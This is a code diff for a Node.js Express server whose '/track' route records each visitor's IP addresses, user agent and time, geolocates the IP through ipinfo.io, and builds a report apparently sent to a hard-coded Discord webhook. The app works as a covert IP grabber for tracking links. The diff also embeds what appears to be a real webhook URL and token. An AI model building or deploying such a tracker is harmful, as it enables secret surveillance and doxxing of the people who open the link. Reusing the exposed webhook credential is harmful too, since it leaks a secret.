@@ -4,14 +4,12 @@ import fetch from "node-fetch";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Replace with your webhook or use an environment variable
 const WEBHOOK_URL =
     process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";
 
-// Trust Render / reverse proxies
 app.set("trust proxy", true);
 
-// Home page
+// Home
 app.get("/", (req, res) => {
     res.sendFile("index.html", { root: process.cwd() });
 });
@@ -20,7 +18,7 @@ app.get("/", (req, res) => {
 app.get("/track", async (req, res) => {
 
     // =========================
-    // IP INFORMATION
+    // IP HANDLING
     // =========================
 
     const forwardedIp =
@@ -34,14 +32,14 @@ app.get("/track", async (req, res) => {
         req.socket.remoteAddress ||
         "Unknown";
 
-    // Remove IPv4-mapped IPv6 prefix
+    // Clean IPv4-mapped IPv6
     ip = ip.replace(/^::ffff:/, "");
 
     const userAgent =
         req.headers["user-agent"] || "Unknown";
 
     // =========================
-    // TIMESTAMP (PH TIME)
+    // TIME (PH)
     // =========================
 
     const timestamp = new Date().toLocaleString("en-PH", {
@@ -56,33 +54,29 @@ app.get("/track", async (req, res) => {
     });
 
     // =========================
-    // GEO LOOKUP
+    // IPINFO LOOKUP
     // =========================
 
     let city = "Unknown";
+    let region = "Unknown";
     let country = "Unknown";
-    let isp = "Unknown";
     let org = "Unknown";
     let ipType = "Unknown";
 
     try {
-        const geoRes = await fetch(
-            `https://ipwho.is/${encodeURIComponent(ip)}`
-        );
-
+        const geoRes = await fetch(`https://ipinfo.io/${ip}/json`);
         const data = await geoRes.json();
 
-        console.log("Geo Response:", data);
+        console.log("IPInfo Response:", data);
 
-        if (data.success) {
-            city = data.city || "Unknown";
-            country = data.country || "Unknown";
-            isp = data.connection?.isp || "Unknown";
-            org = data.connection?.org || "Unknown";
-            ipType = data.type || "Unknown";
-        }
+        city = data.city || "Unknown";
+        region = data.region || "Unknown";
+        country = data.country || "Unknown";
+        org = data.org || "Unknown";
+        ipType = data.ip?.includes(":") ? "IPv6" : "IPv4";
+
     } catch (err) {
-        console.error("Geo lookup failed:", err);
+        console.error("IPInfo lookup failed:", err);
     }
 
     // =========================
@@ -102,15 +96,14 @@ app.get("/track", async (req, res) => {
 
 🕒 Time: ${timestamp}
 
-🌍 Chosen IP: ${ip}
+🌍 IP: ${ip}
 📦 Forwarded IP: ${forwardedIp}
 🧠 Socket IP: ${socketIp}
 
 📶 Type: ${ipType}
 
-📍 Location: ${city}, ${country}
-🏢 ISP: ${isp}
-🏢 Organization: ${org}
+📍 Location: ${city}, ${region}, ${country}
+🏢 Org: ${org}
 
 🖥️ Device: ${userAgent}
 `;
